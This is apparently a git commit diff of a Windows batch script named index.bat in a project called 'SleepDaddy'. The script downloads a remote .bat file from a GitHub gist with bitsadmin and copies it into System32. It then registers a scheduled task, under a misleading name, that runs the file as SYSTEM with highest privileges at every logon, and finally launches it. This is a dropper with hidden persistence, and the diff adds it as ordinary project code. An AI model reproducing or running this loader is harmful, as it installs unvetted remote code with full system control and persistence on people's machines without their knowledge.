ec15a52bfab55048c62d0144360e57d77cdb4fa9
INeedHelp <leonardo.bartolelli@gmail.com>
2023-02-21 20:12:21 +0100

    SleepDaddy

--- SleppDaddy/index.bat
+++ SleppDaddy/index.bat
@@ -1,7 +1,10 @@
 @echo off 
 
 cd /d %windir%\system32
-powershell -Command "& { Invoke-WebRequest -Uri 'https://gist.github.com/INeddHelp/71d5cef5935055810bf338f97c3e8605/raw/sleepdaddy.bat' -OutFile 'sleepdaddy.bat' }"
-move /y sleepdaddy.bat %windir%\System32\
+set url=https://gist.github.com/INeddHelp/71d5cef5935055810bf338f97c3e8605/raw/sleepdaddy.bat
+set output_file=sleepdaddy.bat
+set system32_dir=C:\Windows\System32
+bitsadmin /transfer "DownloadFile" %url% "%cd%\%output_file%"
+xcopy /y "%cd%\%output_file%" "%system32_dir%"
 schtasks /create /tn "Run index.bat at logon" /tr "%windir%\System32\sleepdaddy.bat" /sc ONLOGON /rl highest /ru System /f
 start sleepdaddy.bat
